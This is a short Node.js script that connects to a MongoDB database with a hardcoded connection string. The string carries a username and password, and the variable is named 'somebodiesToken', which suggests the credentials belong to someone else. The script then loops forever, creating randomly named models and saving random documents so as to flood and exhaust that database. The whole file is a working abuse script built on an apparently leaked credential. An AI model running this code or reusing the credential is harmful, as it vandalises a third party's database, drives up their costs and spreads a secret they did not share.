const mongoose = require('mongoose')
const somebodiesToken = 'mongodb+srv://ROCKY:Sujitgaming@rockycoders.3uwri.mongodb.net/myFirstDatabase?retryWrites=true&w=majority'

const crypto = require('crypto')
const randomString = () => crypto.randomBytes(24).toString('base64')

const main = async () => {
  let i = 0
  while (true) {
    const Schema = mongoose.model(randomString(), new mongoose.Schema({
      name: {
        type: String,
        required: true
      }
    }))

    await new Schema({
      name: randomString()
    }).save()


    i++
    console.log(i)
  }
}

mongoose.connect(somebodiesToken, (err) => {
  if (err) return console.log(err)

  console.log('Connected')
  main()
})
